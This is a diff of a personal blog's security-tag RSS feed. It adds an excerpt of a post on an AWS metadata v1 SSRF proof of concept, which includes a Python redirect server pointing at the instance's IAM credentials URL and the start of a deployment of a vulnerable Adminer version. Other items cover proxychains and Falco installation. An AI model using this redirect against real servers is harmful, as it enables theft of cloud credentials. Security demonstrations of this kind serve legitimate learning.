@@ -1,12 +1,28 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>security on Xiao.chen</title>
+    <title>Security on Xiao.chen</title>
     <link>https://blog.wisekee.com/tags/security/</link>
-    <description>Recent content in security on Xiao.chen</description>
+    <description>Recent content in Security on Xiao.chen</description>
     <generator>Hugo -- gohugo.io</generator>
     <copyright>Copyright © 2008–2020, Xiao.chen; all rights reserved.</copyright>
-    <lastBuildDate>Thu, 02 Mar 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.wisekee.com/tags/security/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Thu, 10 Aug 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.wisekee.com/tags/security/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>AWS metadata service v1 SSRF POC</title>
+      <link>https://blog.wisekee.com/post/aws-metadata-ssrf-poc/</link>
+      <pubDate>Thu, 10 Aug 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.wisekee.com/post/aws-metadata-ssrf-poc/</guid>
+      <description>
+        
+          
+            POC process Construct attack machine to listener and redirect the credentials url 1#!/usr/bin/env python3 2 3 4# ./redirect.py 1337 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 5 6import sys 7from http.server import HTTPServer, BaseHTTPRequestHandler 8 9if len(sys.argv)-1 != 2: 10 print(&amp;#34;&amp;#34;&amp;#34; 11 Usage: {} &amp;lt;port_number&amp;gt; &amp;lt;url&amp;gt; 12 &amp;#34;&amp;#34;&amp;#34;.format(sys.argv[0])) 13 sys.exit() 14 15class Redirect(BaseHTTPRequestHandler): 16 def do_GET(self): 17 self.send_response(301) 18 self.send_header(&amp;#39;Location&amp;#39;, sys.argv[2]) 19 self.end_headers() 20 21HTTPServer((&amp;#34;&amp;#34;, int(sys.argv[1])), Redirect).serve_forever() Install the has vulnerability program for example: Adminer v4.7.8 1apiVersion: apps/v1 2kind: Deployment 3metadata: 4 # Unique key of the Deployment instance 5 name: adminer-v4.
+          
+          
+        
+      </description>
+    </item>
+    
     <item>
       <title>Open source security tools for beginners</title>
       <link>https://blog.wisekee.com/post/opensource-security-tools/</link>
@@ -49,7 +65,12 @@ We can install to independent host or kubernetes cluster Please reference previo
       <description>
         
           
-             Hopper Disassembler Ghidra is a software reverse engineering Ghidra script the Ultimate Packer for eXecutables 
+            Posts series about knowledge ELF Format and Runtime Internals
+learning-linux-binary
+Hopper Disassembler
+Ghidra is a software reverse engineering
+Ghidra script
+the Ultimate Packer for eXecutables
           
           
         
@@ -84,23 +105,6 @@ We can install to independent host or kubernetes cluster Please reference previo
           
             proxychains ng (new generation) - a preloader which hooks calls to sockets in dynamically linked programs and redirects it through one or more socks/http proxies. continuation of the unmaintained proxychains project https://github.com/rofl0r/proxychains-ng
 Install 1# On macos 2 HOMEBREW_NO_UPDATE=1 brew install proxychains-ng 3# On linux 4# needs a working C compiler, preferably gcc 5 ./configure --prefix=/usr --sysconfdir=/etc 6 make 7 sudo make install 8 sudo make install-config (installs proxychains.conf) Configuration Create and config file path ~/.
-          
-          
-        
-      </description>
-    </item>
-    
-    <item>
-      <title>Falco reverse shell detecting</title>
-      <link>https://blog.wisekee.com/post/falco-reverse-shell-rules/</link>
-      <pubDate>Fri, 20 May 2022 00:00:00 +0000</pubDate>
-      
-      <guid>https://blog.wisekee.com/post/falco-reverse-shell-rules/</guid>
-      <description>
-        
-          
-            Use install tools this will one site to launch falco
-1curl -o install_falco -s https://falco.org/script/install 2# It should be 59201c1339cc53e86edcd7d2e7273e52f784b3cf7d4a3142059112b3b9062f6d. 3sha256sum install_falco 4sudo bash install_falco Manully install Falco program You can also directly check in Github: falco-rules 1wget https://download.falco.org/packages/bin/x86_64/falco-0.34.1-x86_64.tar.gz 2tar -xzvf falco-0.34.1-x86_64.tar.gz 3apt update -y 4apt install -y dkms make linux-headers-$(uname -r) 5# If you use the falco-driver-loader to build the BPF probe locally you need also clang toolchain 6apt install -y clang llvm 7# can reference the falco site: https://falco.
           
           
         
